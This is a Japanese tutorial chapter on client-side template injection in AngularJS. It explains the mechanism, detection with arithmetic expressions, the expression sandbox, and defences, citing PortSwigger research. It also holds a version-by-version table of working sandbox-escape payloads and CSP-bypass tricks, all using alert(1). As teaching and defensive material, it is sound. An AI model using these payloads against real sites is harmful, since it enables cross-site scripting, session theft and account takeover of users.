## クライアントサイドテンプレートインジェクション（CSTI / AngularJS）

### 概要

クライアントサイドテンプレートインジェクション（Client-Side Template Injection、以下 CSTI）は、AngularJS のようなクライアントサイド（ブラウザ側）のテンプレートフレームワークを使うアプリケーションが、ユーザー入力を動的にページへ埋め込んだときに発生する脆弱性である。PortSwigger の定義そのままに引けば「クライアントサイドテンプレートフレームワークを使うアプリケーションが、ユーザー入力を動的に Web ページへ埋め込むとき、CSTI 脆弱性が生じる」。

これらのフレームワークは、DOM に書き込まれた HTML をブラウザが読み込んだあとにスキャンし、`{{ ... }}` のようなテンプレート構文（AngularJS では「式（expression）」と呼ぶ）を見つけると、それを JavaScript 風の式として評価し、結果をページに埋め込む。もしユーザー入力が、フレームワークがテンプレートとしてスキャンする DOM 領域にサニタイズされずに挿入されると、攻撃者は `{{ }}` の中に任意の式を注入でき、フレームワーク自身にその式を実行させられる。

ここで決定的に重要なのは、**攻撃の sink（入力が最終的に実行・解釈される危険な代入先）が `innerHTML` のような明示的な JavaScript／HTML 実行 API である必要がない**という点である。テンプレートエンジンのコンパイル処理そのものが sink になる。これが「`<script>` タグやイベントハンドラ属性を注入する」従来型の XSS と根本的に異なる特徴であり、PortSwigger の研究論文タイトル「XSS without HTML（HTML なしの XSS）」が示すとおり、HTML インジェクションを一切使わずにコード実行へ到達できる。

しかも、この攻撃は **ユーザー入力が HTML エンコードされていても、かつ属性値の中にあっても成立しうる**。研究論文はこう述べている。「もしユーザー入力がページに直接埋め込まれるなら、そのアプリケーションはクライアントサイドテンプレートインジェクションに対して脆弱かもしれない。これはユーザー入力が HTML エンコードされ、属性の内側にあっても真である」。理由は後述するが、HTML エンコードは「HTML パーサに対する防御」であって、その後段で走る「Angular のテンプレートコンパイラ」に対しては無力だからである。

> 出典: Client-side template injection — https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection

### なぜ動くのか（仕組みレベルの説明）

通常の XSS は「ブラウザの HTML パーサ／JS パーサに、意図しないタグやスクリプトを解釈させる」ことが本質である。一方 CSTI は、そのパーサの手前に**もう一段、アプリケーション（フレームワーク）自身が実装したテンプレートコンパイラ**が挟まっている点が肝である。

AngularJS（v1.x 系）は起動時に、`ng-app` ディレクティブが指定された DOM ツリー全体（あるいは `$compile` を明示的に呼んだ範囲）を走査し、テキストノードや属性の中から `{{expr}}` というパターンを探す。見つけた式 `expr` は、素朴な `eval()` にかけられるのではなく、Angular 独自の**式パーサ（expression parser）**によって構文解析され、Angular の実行コンテキスト（`$scope`、フィルタ関数群）の中で評価される。処理の流れを分解すると次のようになる。

1. ブラウザの HTML パーサが DOM を構築する。この段階では `<script>` もイベントハンドラも不要で、単なるテキストとして `{{...}}` が DOM に入っていればよい。
2. Angular のコンパイラがそのテキストノード／属性を見つけ、`{{...}}` の中身を Angular 式として構文木（AST）に変換し、実行用の関数へコンパイルする。
3. その式が生成する値（多くの場合は関数呼び出しの戻り値）が、Angular のサンドボックス（1.6 未満）や信頼済みコンテキストのチェックを経て評価される。

したがって攻撃者は、自分が制御できる文字列が「AngularJS がコンパイル対象とみなす DOM 領域」に生の文字列として入りさえすれば、`<script>` タグや `onerror` 属性を一切使わずコード実行まで到達できる。これは「アプリケーション自身が用意した第二のインタプリタに、入力を再解釈させる」という一般化された脆弱性クラス（テンプレートインジェクション）の一種であり、サーバーサイドテンプレートインジェクション（SSTI、Jinja2 や FreeMarker など）と原理的にはまったく同じ構造を持つ。違いは実行される場所（ブラウザ内の JS 実行コンテキスト）だけである。

そして HTML エンコードが効かない理由もここにある。`{{7*7}}` を `&#123;&#123;7*7&#125;&#125;` のように文字参照でエンコードしても、ブラウザの HTML パーサはそれを **デコードして** テキストノード `{{7*7}}` を作る。Angular のコンパイラが見るのはそのデコード後のテキストなので、エンコードは素通りしてしまう。つまり「HTML エンコードは HTML 文脈の防御であって、テンプレート文脈の防御ではない」ということである。

### 基本的な検出手順

WAF やサニタイザがどの HTML タグ・属性をブロックしていても、CSTI は通常の HTML ペイロードとは別チャネルを通るため素通りしやすい。検出は算術式を注入するのが定石である。

```
{{7*7}}
```

このペイロードが反射された際に、リテラルの `{{7*7}}` ではなく `49` という数値が表示されれば、そのページはユーザー入力を AngularJS（あるいは同様の `{{ }}` 構文を持つ Vue などのフレームワーク）でコンパイルしている証拠であり、CSTI が成立する。なぜ動くかというと、AngularJS は文字列の中身がどんな意味を持つかを検査せず、構文的に `{{ }}` を見つけたら中の式を評価するため、算術式であっても実行されてしまうからである。同様に `{{1+1}}` は `2` を返す。

いったん `{{7*7}}=49` が確認できたら、次は Angular のバージョンによって「どこまで踏み込めるか」が変わる。ページに読み込まれている `angular.min.js` のバージョン、あるいは `angular.version` の値を確認するのが次の一手になる。

### AngularJS のサンドボックス機構

なぜバージョンごとにペイロードが変わるのか。それは AngularJS が「式サンドボックス（expression sandbox）」という仕組みを持ち、その実装が版ごとに強化・修正されてきたからである。

サンドボックスは、テンプレート式から `window`・`document`・DOM 要素・`Function` コンストラクタなどの「危険なオブジェクト」へのアクセスと、`__proto__` などの「危険なプロパティ」へのアクセスを遮断しようとする防御機構である。式パーサは構文木を作る際に、安全確認のためのチェック関数呼び出しを式のコードへ差し込む。主なチェック関数は次のとおり。

- **`ensureSafeObject()`**: 評価対象のオブジェクトが `Function` コンストラクタ、`window` オブジェクト、DOM 要素、`Object` コンストラクタのいずれかでないかを検査し、該当すれば例外を投げる。
- **`ensureSafeMemberName()`**: `__proto__` のような危険なプロパティ名へのアクセスを禁止する。
- **`ensureSafeFunction()`**: `Function` コンストラクタや `call()`・`apply()`・`bind()`・`constructor()` の呼び出しを遮断する。

つまり `{{constructor.constructor('alert(1)')()}}`（後述する `Function` コンストラクタ経由でのコード実行）のような「素朴な」ペイロードは、サンドボックスが有効なバージョンではこれらのチェックに引っかかって失敗する。サンドボックスを突破する（escape する）には、これらのチェック自体を無効化するか、チェックの盲点を突く必要があった。

そして重要な結論として、**Angular チームは 1.6（2017 年頃）でサンドボックスを完全に撤廃した**。これは「サンドボックスは攻撃者を止めることを意図したものではない」という設計判断による恒久的な仕様変更である。研究論文はこう記す。「Angular はバージョン 1.6 の時点でサンドボックスを完全に取り除いた」。したがって以降のペイロード表は「サンドボックスが有効だった 1.0〜1.5 系ではどう回避したか」という歴史であり、1.6 以降では回避すら不要になる。

> 出典: XSS without HTML: Client-Side Template Injection with AngularJS — https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs

### サンドボックス回避の中核原理: `charAt` の破壊

数々の回避手法のうち、Gareth Heyes（PortSwigger）が発見しのちの多数のペイロードの土台になった中核テクニックが、**ネイティブの `String.prototype.charAt` を書き換えてパーサのロジックを壊す**手法である。原典から引くと、突破口となったのは次のような一行だった。

```
'a'.constructor.prototype.charAt=[].join
```

なぜこれが効くのか。Angular の式パーサは、識別子（変数名など）を読み取る際に `isIdent()` という関数で「その文字が識別子として妥当か」を判定する。`isIdent` は概ね次のような比較を行う。

```
('a' <= ch && ch <= 'z' || 'A' <= ch && ch <= 'Z' || '_' === ch || ch === '$')
```

ここで `ch` は、入力文字列から `charAt()` で 1 文字ずつ取り出したものである。ところが `charAt` を `[].join`（配列の `join` メソッド）に差し替えると、`charAt` を呼んだときに「引数を連結した文字列」が返るようになる。たとえば本来 1 文字 `'x'` を返すはずの箇所で、`'x=alert(1)'` のような長い文字列が返ってしまう。

それでも `isIdent` の比較は、返ってきた文字列の**先頭 1 文字**だけを境界値と比べるため、`'x=alert(1)'` の先頭が `'x'`（`'a'`〜`'z'` の範囲内）である以上、判定は通過してしまう。ところがパーサはその後、`isIdent` が真だった元の文字列全体を識別子名として使ってしまうため、`x=alert(1)` というコードが、生成される関数の中に丸ごと注入される。これがサンドボックスチェックの手前で「識別子だと誤認させる」ことによる回避の本質である。

この `charAt` 破壊を仕込んだうえで、次のように Angular の `$eval()`（式を評価する内部 API）を呼び、任意コードを実行する。

```
$eval('x=alert(1)')
```

さらに、クォートが使えない環境では `String.fromCharCode()` を `constructor` 経由で組み立てて文字列を生成し、`$eval()` の代わりに `orderBy` フィルタを使う手もある。AngularJS ではパイプ記号 `|` がフィルタ適用を意味し、`orderBy` フィルタは式を受け取れるため、これがペイロードの注入口になる。

```
[123]|orderBy:'Some string'
```

### `constructor.constructor` チェーンによる Function 到達

より初期のバージョンでは、`constructor.constructor` というプロパティチェーンをたどって `Function` コンストラクタへ直接到達し、任意コードを実行できた。

```
{{constructor.constructor('alert(1)')()}}
```

なぜ動くのか。JavaScript では、任意のオブジェクトの `constructor` はそれを生成した関数を指し、関数の `constructor` はさらに `Function`（＝ JavaScript のコード文字列から関数を生成できる、`eval` 相当の危険なコンストラクタ）を指す。したがって `constructor.constructor('alert(1)')` は `Function('alert(1)')` と等価な新しい関数を作り、末尾の `()` でそれを即時実行する。サンドボックスはまさにこの経路（`Function` への到達）を塞ごうとしたため、後続バージョンではこのペイロードが通らなくなり、前述の `charAt` 破壊のような迂回が必要になった。そして 1.6 でサンドボックスが撤廃された結果、この最もシンプルなペイロードが再び有効になったのは皮肉である。

### バージョン別サンドボックス回避ペイロード一覧

以下は研究論文が掲載しているバージョン別の回避ペイロードである。各行末の括弧内は発見者。これらは公開済みの研究資料に掲載された「歴史的記録」であり、対象バージョンと発見者を明記して引用する。実運用の AngularJS はいずれも保守終了（EOL、2022 年 1 月にサポート終了）しているため、これらは主に「どのバージョンのサンドボックスがどう破られたか」という原理理解のための資料と位置づけてほしい。

**1.0.1 – 1.1.5**（Mario Heiderich / Cure53）:
```
{{constructor.constructor('alert(1)')()}}
```

**1.2.0 – 1.2.1**（Jan Horn / Google）:
```
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

**1.2.2 – 1.2.5**（Gareth Heyes / PortSwigger）:
```
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window.x)alert(window.x=1)')+eval(y)+"'");}}
```

**1.2.6 – 1.2.18**（Jan Horn / Google）:
```
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
```

**1.2.19 – 1.2.23**（Mathias Karlsson）:
```
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
```

**1.2.24 – 1.2.29**（Gareth Heyes / PortSwigger）:
```
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window.x)alert(window.x=1)')+eval(y)+\"'");}}
```

**1.3.0**（Gábor Molnár / Google）:
```
{{!ready && (ready = true) && (!call ? $$watchers[0].get(toString.constructor.prototype) : (a = apply) && (apply = constructor) && (valueOf = call) && (''+''.toString('F = Function.prototype;F.apply = F.a;delete F.a;delete F.valueOf;alert(1);')))}}
```

**1.3.1 – 1.3.2**（Gareth Heyes / PortSwigger）:
```
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf;$eval('x=alert(1)//');}}
```

**1.3.3 – 1.3.18**（Gareth Heyes / PortSwigger）:
```
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}
```

**1.3.19**（Gareth Heyes / PortSwigger）:
```
{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}
```

**1.3.20**（Gareth Heyes / PortSwigger）:
```
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

**1.4.0 – 1.4.9**（Gareth Heyes / PortSwigger）:
```
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//')}}
```

**1.5.0 – 1.5.8**（Ian Hickey）:
```
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)')}}
```

**1.5.9 – 1.5.11**（Jan Horn / Google）:
```
{{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';astNode.argument={type:'Identifier',name:'foo'};");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}}
```

**>= 1.6.0**（Mario Heiderich / Cure53）:
```
{{constructor.constructor('alert(1)')()}}
```

この一覧から読み取れる重要な傾向は 2 つある。第一に、`charAt` 破壊系（Gareth Heyes 由来）が 1.2.24 以降 1.5 系まで系譜として続いていること。バージョンが上がるたびにサンドボックスが `charAt` の書き換えを検知・防御しようとし、それをさらに一手ずらして回避する、というイタチごっこが見て取れる。第二に、最初（1.0 系）と最後（1.6 以降）のペイロードが同一の `{{constructor.constructor('alert(1)')()}}` である点。これは「サンドボックスが無かった時代に戻った」ことを意味し、サンドボックスという防御の努力が結局は放棄された歴史を象徴している。

### サニタイザ破壊（`charCodeAt` の書き換え）

`charAt` を壊す発想は、Angular の**サニタイザ**（`ngSanitize` / `$sanitize`。HTML を安全化してから出力する機構）を壊すことにも応用できる。研究論文は、サニタイザ内部の `encodeEntities` 関数が呼ぶ `charCodeAt` を書き換えることで属性を注入する手法を示している。

```
'a'.constructor.charCodeAt=[].concat;
```

これを仕込むと、`charCodeAt(0)` が「数値の文字コード」ではなく「連結された文字列＋引数」を返すようになる。`encodeEntities` は文字を数値コードに変換してエンティティ化することで危険文字を無害化しているが、そのコードが数値でなく文字列になってしまうと、エンティティ化のロジックが破綻し、属性のサニタイズをすり抜けられる。`charAt` のときと同じく「ネイティブメソッドの戻り値の型・意味を書き換えて、後段のロジックの前提を崩す」という共通原理である。

### CSP バイパス

AngularJS が読み込まれているサイトでは、コンテンツセキュリティポリシー（CSP）を回避できる場合がある。CSP は `script-src` で許可されたソース以外のスクリプト実行を禁じるが、Angular 式の評価はあくまで「すでに許可されて読み込まれた Angular ライブラリ自身が行う内部処理」なので、外部スクリプトの追加を禁じる CSP をすり抜けうる。研究論文が示す代表的な手口を 2 つ挙げる。

**手口 1: `$event.path` を使う**

```
<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
```

`ng-focus` はフォーカス時に発火する Angular のイベントディレクティブで、`autofocus` によって自動的にフォーカスが当たり式が評価される。`$event` オブジェクトはイベント情報を保持しており、その `path` 配列（イベントの伝播経路）の最後の要素が `window` オブジェクトになる。`orderBy` フィルタに渡された式の中で `[].constructor.from([1], alert)`（`Array.from` に配列とコールバック `alert` を渡す形）を使うと、`from()` が配列の各要素を処理する過程で `window` をサンドボックスの検知から隠しつつ `alert` を呼び出せる。

**手口 2: `array.map()` を使う**

```
[1].map(alert)
```

これは `alert` を間接的に呼ぶ手法で、`window.alert` のように `window` を明示的に書かないため、`window` を検知しようとするサンドボックスをすり抜けられる。`[1].map(alert)` は配列 `[1]` の各要素に `alert` を適用するので、実質的に `alert(1)` が呼ばれる。

### バージョンと修正のタイムライン

サンドボックス回避と修正の経緯は、研究がベンダーと連携して進められたことを示している。

- **2015 年 9 月 25 日**: サンドボックス回避が Google に非公開で報告される。
- **2016 年 1 月 15 日**: Google がバージョン 1.5.0 を修正（前掲の 1.5.0–1.5.8 用ペイロードはこの修正後を対象とするもの）。
- **2016 年 9 月（Angular 1.6）**: サンドボックスを完全に撤廃。以降、回避テクニックそのものが不要になった。

なお、AngularJS（1.x 系）全体のサポートは 2022 年 1 月に終了している。現行の Angular（2 以降）は別アーキテクチャであり、`{{ }}` の式評価も本節で扱った 1.x 系のサンドボックスとは仕組みが異なる（Angular 2+ 特有の問題は別節で扱う）。

### 影響

CSTI で到達できるのは被害者ブラウザ内での任意 JavaScript 実行であり、実害は通常の反射型・格納型 XSS と同種である。すなわち Cookie／セッショントークンの窃取、セッションハイジャック、被害者権限での操作の代行、フィッシング的な DOM 改ざんなどに及ぶ。特筆すべきは、**HTML タグやイベントハンドラを一切使わずに** これらへ到達できる点で、`<`・`>`・`"` などをすべてエスケープする従来型 XSS 対策や、`<script>` を除去するタグ単位のサニタイザを完全にすり抜ける。テンプレート構文というまったく別のチャネルを使うためである。

### 防御

PortSwigger のガイダンスは明快である。まず「テンプレートや式を生成するのにユーザー入力を使わない」ことが第一原則である。そのうえで、

- **テンプレート構文をユーザー入力から除去する**。中括弧 `{{` `}}` を含むユーザー入力を「非常に危険」なものとして扱い、テンプレート化される領域へ入れる前にテンプレート構文を除去する。研究論文は端的に、中括弧を含む入力を highly dangerous とみなすか、そもそもユーザー入力をサーバー側で反射しないことを推奨している。
- **HTML エンコードに頼らない**。「HTML エンコードだけでは不十分」である。前述のとおり、フレームワークが式を評価する前にブラウザがエンコードをデコードしてしまうため、HTML エンコードは CSTI に対する防御にならない。
- **サニタイズ対象領域を Angular のコンパイル対象から外す**。信頼できないコンテンツを描画する領域には `ng-non-bindable` を付与する、あるいはそもそも `ng-app` のスコープ外へ配置する、といった設計上の分離が有効である。
- **フレームワークのパッチ管理を徹底する**。ただし研究論文が警告するとおり、「Angular を更新するだけでは不十分」であり、式インジェクションという根本問題に対処しない限り安全にはならない。Angular 公式ドキュメントは、ユーザー入力をテンプレートに動的に埋め込むことを戒める一方で、「Angular が安全なコードに XSS を持ち込むことはない」と誤解を招く書き方をしている、と研究論文は指摘している。フレームワークの安全機構を過信しないことが肝要である。

> 出典: XSS without HTML: Client-Side Template Injection with AngularJS — https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs

### まとめ

CSTI の本質は「ブラウザの HTML／JS パーサの手前に、フレームワーク独自のテンプレートインタプリタがもう一段存在し、そこがコード実行の sink になる」という二重構造にある。この構造ゆえに、HTML エンコードやタグ除去といった従来型 XSS 対策は無力化される。AngularJS 1.x のサンドボックスは `window`・`Function`・`__proto__` などへの到達を防ごうとしたが、`charAt`・`charCodeAt` などネイティブメソッドの戻り値の意味を書き換えてパーサ自身のロジックを崩す手法によって版ごとに突破され、最終的に 1.6 でサンドボックスは撤廃された。防御の要点は、テンプレート構文をユーザー入力に持ち込ませないこと、そして「HTML エンコードやフレームワークの安全機構が守ってくれる」という前提を捨てることである。

---

前へ: [第4章 高度な回避技術](04-advanced.md) ｜ [目次](README.md) ｜ 次へ: [CSTI補足（HackTricks / Beyond XSS）](#csti補足)
